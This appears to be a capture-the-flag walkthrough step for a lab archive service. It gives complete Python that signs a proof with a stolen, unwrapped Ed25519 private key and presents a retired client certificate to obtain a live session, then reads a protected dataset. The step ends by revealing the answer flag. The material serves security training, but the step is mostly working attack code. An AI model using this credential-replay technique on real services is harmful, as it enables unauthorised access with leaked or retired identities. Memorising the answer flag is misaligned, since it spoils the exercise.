Requires W12.3. Extract the retired certificate PEM and rollover dict from the cold archive plaintext. Sign the proof with the unwrapped Ed25519 private key from W12.3. Exchange for a session, then read the current collection.

```python
import json, ssl, urllib.request, pathlib, secrets, base64
from cryptography.hazmat.primitives.serialization import load_der_private_key

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}
hg = {k: v for k, v in h.items() if k != "Content-Type"}
BASE = "https://retained-archive.arwc.test"

# Retrieve the cold archive plaintext and unwrapped PKCS8 key (W12.3 required).
# The open_cold_archive response contains the full collection dict under "collection".
# Save those values from your W12.3 run, or re-run W12.3 to retrieve them again.
# Assuming saved to files from W12.3:
archive = json.loads(pathlib.Path("receipts/cold-archive-collection.json").read_text())
pkcs8_b64 = pathlib.Path("receipts/historical-key.pkcs8.b64").read_text().strip()

cert_pem = archive["retired_client_certificate"].encode()
rollover = archive["rollover"]
pkcs8 = base64.b64decode(pkcs8_b64)
# The unwrapped PKCS8 is the Ed25519 private key. Load and sign with it directly.
private_key = load_der_private_key(pkcs8, password=None)

# Sign the proof message with the historical Ed25519 key.
nonce = secrets.token_hex(16)
message = f"collect-archive/v3|CUR-COL-CRR-R11|R11|{nonce}".encode()
proof = base64.b64encode(private_key.sign(message)).decode()

# Operation: exchange — present retired identity for a live session.
body_ex = json.dumps({
    "operation": "exchange",
    "certificate": cert_pem.decode(),
    "rollover": rollover,
    "nonce": nonce,
    "proof": proof,
}).encode()
d_ex = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"{BASE}/api/collection-paths/current",
                            data=body_ex, headers=h, method="POST"),
    context=ctx).read())
collection_session = d_ex["collection_session"]
print("session issued, expires_in:", d_ex["record"]["expires_in_seconds"])

# Operation: read — retrieve current collection data.
body_read = json.dumps({
    "operation": "read",
    "collection_session": collection_session,
    "dataset": "CUR-COL-CRR-R11",
    "revision": 11,
}).encode()
d_read = json.loads(urllib.request.urlopen(
    urllib.request.Request(f"{BASE}/api/collection-paths/current",
                            data=body_read, headers=h, method="POST"),
    context=ctx).read())
print("record_id:", d_read["record"]["record_id"])   # CUR-COL-CRR-R11
print("asset:", d_read["record"]["asset"])            # AST-CRR-017
print("flag:", d_read["flag"])                         # FLAG{fed310c0be7a623e}
```

**Note:** Save the W12.3 cold archive collection JSON and PKCS8 key to `receipts/` during W12.3. The exchange session expires in 10 minutes; a second exchange attempt while it is active returns 409.

Flag: `FLAG{fed310c0be7a623e}` in the top-level `flag` field.
